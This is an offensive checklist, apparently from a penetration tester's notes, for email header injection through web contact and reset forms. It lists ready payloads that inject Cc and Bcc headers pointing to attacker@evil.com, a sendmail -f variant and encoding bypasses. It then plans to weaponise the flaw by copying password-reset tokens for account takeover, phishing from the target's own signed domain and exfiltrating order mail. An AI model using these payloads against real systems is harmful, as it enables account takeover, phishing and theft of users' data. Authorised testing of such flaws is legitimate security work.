# Email Injection

## Before I start
- [ ] Contact/invite/reset form that sends mail; an inbox I control to catch results

## Core payloads
email=victim@target%0ACc:attacker@evil.com
email=victim@target%0D%0ABcc:attacker@evil.com
email=victim@target%0A%0AAttacker body here
email=-fattacker@evil.com
- [ ] Inject into EVERY reflected field — Subject and Name are sanitized least
- [ ] Success = my inbox receives the form's mail (or a BCC copy)

## Weaponize
- [ ] BCC myself onto password-reset mail → token in my inbox = takeover
- [ ] Phish from the target's own domain — their SPF/DKIM signs it
- [ ] Exfil: BCC onto order confirmations / ticket replies

## Validate
- [ ] Compare delivered headers — injected fields appear verbatim
- [ ] mail() 5th-param (-f) variant only when PHP/sendmail underneath

## If it fails
- [ ] Framework rejects CRLF → URL-encoded, double-encoded, \n only, \r only
- [ ] Nothing reflects into headers → bug absent; the form is just a form

## Next
- [ ] Working relay → phishing pretext against the client's users
- [ ] Reset poisoning → account takeover → :Pb api
